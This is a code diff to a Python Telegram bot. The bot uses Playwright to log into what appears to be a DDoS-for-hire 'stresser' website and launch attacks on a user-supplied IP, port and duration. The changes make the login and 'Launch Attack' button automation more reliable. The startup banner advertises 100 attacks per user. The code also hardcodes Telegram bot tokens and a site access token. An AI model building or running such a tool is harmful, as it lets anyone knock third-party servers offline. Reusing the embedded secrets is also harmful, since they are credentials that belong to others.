@@ -4,6 +4,7 @@ import logging
 import threading
 import time
 import asyncio
+import glob
 from datetime import datetime
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
@@ -13,7 +14,7 @@ from playwright.async_api import async_playwright
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8521144614:AAHqwJZ5mLRKXQWAuY1I4uyds6aURQuZfGo"
+BOT_TOKEN = "8521144614:AAFgrW0sogin8dVoILU2TCkE9qBI4TCXE7E"
 WEBSITE_URL = "https://satellitestress.st/attack"
 LOGIN_URL = "https://satellitestress.st/login"
 WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"
@@ -34,100 +35,158 @@ def save_attacks(data):
 
 attacks = load_attacks()
 
+# ==================== PLAYWRIGHT SETUP ====================
+def get_playwright_chromium_path():
+    """Find Playwright's installed Chromium path"""
+    cache_dir = os.path.expanduser("~/.cache/ms-playwright")
+    chromium_folders = glob.glob(f"{cache_dir}/chromium-*")
+    
+    if chromium_folders:
+        linux_path = os.path.join(chromium_folders[0], "chrome-linux", "chrome")
+        if os.path.exists(linux_path):
+            return linux_path
+    return None
+
 # ==================== PLAYWRIGHT ATTACK FUNCTION ====================
 async def launch_attack_playwright(ip, port, duration):
     try:
         async with async_playwright() as p:
+            # Get Chromium path
+            chromium_path = get_playwright_chromium_path()
+            
             # Launch browser
-            browser = await p.chromium.launch(headless=True)
+            if chromium_path:
+                browser = await p.chromium.launch(
+                    executablePath=chromium_path,
+                    headless=True
+                )
+            else:
+                browser = await p.chromium.launch(headless=True)
+            
             context = await browser.new_context(viewport={'width': 1280, 'height': 720})
             page = await context.new_page()
             
-            # === LOGIN ===
+            # ========== LOGIN SECTION - FIXED ==========
             print("🔑 Logging in...")
             await page.goto(LOGIN_URL, wait_until='networkidle')
-            await page.wait_for_selector('input[name="token"]', timeout=10000)
-            await page.fill('input[name="token"]', WEBSITE_TOKEN)
+            
+            # Wait for page to fully load
+            await page.wait_for_timeout(5000)
+            
+            # Find token field - multiple attempts
+            token_field = None
+            for attempt in range(3):
+                try:
+                    token_field = await page.wait_for_selector('input[type="text"]', timeout=10000)
+                    if token_field:
+                        print(f"✅ Token field found on attempt {attempt+1}")
+                        break
+                except:
+                    print(f"⏳ Attempt {attempt+1} failed, retrying...")
+                    await page.wait_for_timeout(2000)
+            
+            if not token_field:
+                # Save page for debugging
+                content = await page.content()
+                with open("login_debug.html", "w", encoding="utf-8") as f:
+                    f.write(content)
+                return False, "❌ Token field not found. Check login_debug.html"
+            
+            # Clear and fill token
+            await token_field.fill('')
+            await token_field.fill(WEBSITE_TOKEN)
+            print("✅ Token entered")
             
             # Check for CAPTCHA
             captcha = await page.query_selector('input[name="captcha"]')
             if captcha:
                 return False, "CAPTCHA_REQUIRED"
             
-            await page.click('button:has-text("Login")')
-            await page.wait_for_timeout(3000)
+            # Find and click login button
+            login_btn = await page.wait_for_selector('button:has-text("Login")', timeout=10000)
+            await login_btn.click()
+            print("✅ Login button clicked")
             
-            # === ATTACK PAGE ===
+            # Wait for login to process
+            await page.wait_for_timeout(5000)
+            
+            # ========== ATTACK PAGE SECTION ==========
             print("🎯 Navigating to attack page...")
             await page.goto(WEBSITE_URL, wait_until='networkidle')
-            await page.wait_for_timeout(3000)
+            await page.wait_for_timeout(5000)
             
-            # === FIND INPUT FIELDS - EXACT SELECTORS ===
+            # ========== FIND INPUT FIELDS ==========
             print("🔍 Finding input fields...")
             
-            # IP Field - using placeholder
-            ip_field = await page.query_selector('input[placeholder="104.29.138.132"]')
-            if not ip_field:
-                # Fallback: first text input
-                inputs = await page.query_selector_all('input[type="text"]')
-                if len(inputs) >= 1:
-                    ip_field = inputs[0]
+            # Wait for inputs to be present
+            await page.wait_for_selector('input[type="text"]', timeout=15000)
+            inputs = await page.query_selector_all('input[type="text"]')
+            print(f"🔍 Found {len(inputs)} text input fields")
             
-            if ip_field:
-                await ip_field.fill('')
-                await ip_field.fill(ip)
+            # Filter out hidden inputs
+            visible_inputs = []
+            for inp in inputs:
+                is_hidden = await inp.get_attribute('type') == 'hidden'
+                if not is_hidden:
+                    visible_inputs.append(inp)
+            
+            print(f"👁️ Visible inputs: {len(visible_inputs)}")
+            
+            if len(visible_inputs) >= 3:
+                # IP Field
+                await visible_inputs[0].fill('')
+                await visible_inputs[0].fill(ip)
                 print(f"✅ IP entered: {ip}")
-            else:
-                return False, "❌ IP field not found"
-            
-            # Port Field - using placeholder or second input
-            port_field = await page.query_selector('input[placeholder="80"]')
-            if not port_field:
-                inputs = await page.query_selector_all('input[type="text"]')
-                if len(inputs) >= 2:
-                    port_field = inputs[1]
-            
-            if port_field:
-                await port_field.fill('')
-                await port_field.fill(str(port))
+                
+                # Port Field
+                await visible_inputs[1].fill('')
+                await visible_inputs[1].fill(str(port))
                 print(f"✅ Port entered: {port}")
-            else:
-                return False, "❌ Port field not found"
-            
-            # Duration Field - using placeholder or third input
-            duration_field = await page.query_selector('input[placeholder="60"]')
-            if not duration_field:
-                inputs = await page.query_selector_all('input[type="text"]')
-                if len(inputs) >= 3:
-                    duration_field = inputs[2]
-            
-            if duration_field:
-                await duration_field.fill('')
-                await duration_field.fill(str(duration))
+                
+                # Duration Field
+                await visible_inputs[2].fill('')
+                await visible_inputs[2].fill(str(duration))
                 print(f"✅ Duration entered: {duration}")
             else:
-                return False, "❌ Duration field not found"
+                return False, f"❌ Sirf {len(visible_inputs)} visible inputs mile"
             
-            # === LAUNCH BUTTON - EXACT SELECTOR ===
+            # ========== FIND LAUNCH BUTTON ==========
             print("🔍 Finding launch button...")
             
-            # Try exact button selector from inspect
-            launch_btn = await page.query_selector('button.w-full.bg-cyan-500')
+            # Try multiple button selectors
+            button_selectors = [
+                'button:has-text("Launch Attack")',
+                'button:has-text("Launch")',
+                'button.bg-cyan-500',
+                'button.w-full',
+                'button[type="submit"]'
+            ]
+            
+            launch_btn = None
+            for selector in button_selectors:
+                try:
+                    btn = await page.query_selector(selector)
+                    if btn:
+                        launch_btn = btn
+                        print(f"✅ Button found with: {selector}")
+                        break
+                except:
+                    continue
             
             if not launch_btn:
-                # Fallback: look for button with Launch text
-                buttons = await page.query_selector_all('button')
-                for btn in buttons:
-                    text = await btn.text_content()
-                    if text and "Launch" in text:
-                        launch_btn = btn
-                        break
+                # Try to find any button
+                all_buttons = await page.query_selector_all('button')
+                print(f"🔍 Found {len(all_buttons)} buttons total")
+                
+                if all_buttons:
+                    launch_btn = all_buttons[-1]
+                    print("✅ Using last button as launch button")
+                else:
+                    return False, "❌ Launch button nahi mila"
             
-            if launch_btn:
-                await launch_btn.click()
-                print("✅ Launch button clicked")
-            else:
-                return False, "❌ Launch button not found"
+            # Click launch button
+            await launch_btn.click()
+            print("✅ Launch button clicked")
             
             # Wait for attack to register
             await page.wait_for_timeout(5000)
@@ -236,7 +295,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = query.from_user.id
         context.user_data.clear()
         
-        # Check if attack already running
         if attacks.get("current") is not None:
             await query.message.edit_text("⚠️ Attack already running. Wait!")
             return
@@ -257,12 +315,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"This may take a moment..."
         )
         
-        # Run Playwright attack
         loop = asyncio.get_event_loop()
         
         def attack_thread():
             try:
-                # Run async function in thread
                 future = asyncio.run_coroutine_threadsafe(
                     launch_attack_playwright(ip, port, duration),
                     loop
@@ -271,7 +327,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 
                 attacks["current"] = None
                 
-                # Update attack count
                 counts = attacks.get("user_counts", {})
                 user_key = str(user_id)
                 counts[user_key] = counts.get(user_key, 0) + 1
@@ -330,7 +385,8 @@ def main():
     print("🔥 PLAYWRIGHT ATTACK BOT STARTED")
     print("="*50)
     print(f"👤 Everyone gets 100 attacks")
-    print(f"📁 Check attack_result.png for verification")
+    print(f"📁 Check login_debug.html if issues")
+    print(f"📸 Screenshot: attack_result.png")
     print("="*50)
     
     app.run_polling()
